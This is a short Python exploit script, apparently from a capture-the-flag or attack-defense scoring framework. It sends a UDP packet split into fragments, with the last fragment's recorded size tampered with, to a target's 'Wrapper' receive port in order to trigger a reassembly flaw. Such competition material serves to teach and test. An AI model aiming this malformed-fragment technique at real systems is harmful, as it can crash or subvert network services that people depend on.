#!/usr/bin/python

from base_exploit import *
from netfw import *
from reporter import *


class frags(base_exploit):
    id = EXPLOIT_ID_FRAGS

    def exploit(self, ip, port):
        # Create a connection to requested destination
        s = socket(AF_INET, SOCK_DGRAM)
        s.connect((ip, port))

        pkt = "\x00" * 8 + "abcdefghijklmnopqrstuvwxyz" * 20
        frags = FragmentedPacket(pkt)

        # Change the last fragment's size
        frags.fragments[-1].original_size = 16

        frags.send(s)

if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "Fragmentation exploit"
        print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
        exit(0)

    exp = frags(TEAM_CONFIG_DEBUG)
    score = exp.run()
    print "exploit returned score %s" % score

